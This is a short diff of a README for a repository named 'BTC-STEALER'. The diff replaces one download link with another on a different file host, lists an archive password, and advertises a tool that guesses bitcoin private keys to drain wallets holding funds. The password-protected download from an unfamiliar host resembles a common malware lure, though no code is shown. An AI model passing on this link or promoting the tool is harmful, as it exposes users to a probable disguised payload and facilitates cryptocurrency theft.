@@ -1,5 +1,5 @@
 # BTC-STEALER
-[Click Here To Download](https://www.mediafire.com/file/kln7vobknmrs07p/BTCstealer.zip/file)
+[Click Here To Download](https://rdmfile.eu/install/xzOmvODO5kGZ)
 [Pass : S0f4fr33!]
 
 Generate random bitcoin wallets & private keys (seeds) and then check if they match any wallet that has a positive balance, and then take all the btc from it.
